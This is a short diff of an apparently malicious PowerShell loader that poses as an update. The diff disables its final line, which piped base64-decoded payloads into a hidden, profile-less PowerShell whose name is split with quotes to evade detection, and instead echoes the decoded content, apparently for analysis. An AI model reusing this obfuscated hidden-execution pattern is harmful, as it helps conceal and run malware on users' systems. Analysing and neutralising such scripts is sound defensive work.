@@ -30,9 +30,16 @@ $update_p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64
 $update_a1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1))
 $update_r1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r1))
 
+
+echo $update_p2
+echo "[*]"
+echo $update_a1
+echo "[*]"
+echo $update_r1
+
 echo "[*]"
 start-sleep -s 1
 echo "[!] Update Process Completed"
 start-sleep -s 1
 
-echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -
+#echo $update_a1 | pow""ersh""ell -nop - ; echo $update_r1 | pow""e""rsh""ell -nop -windowstyle hidden -
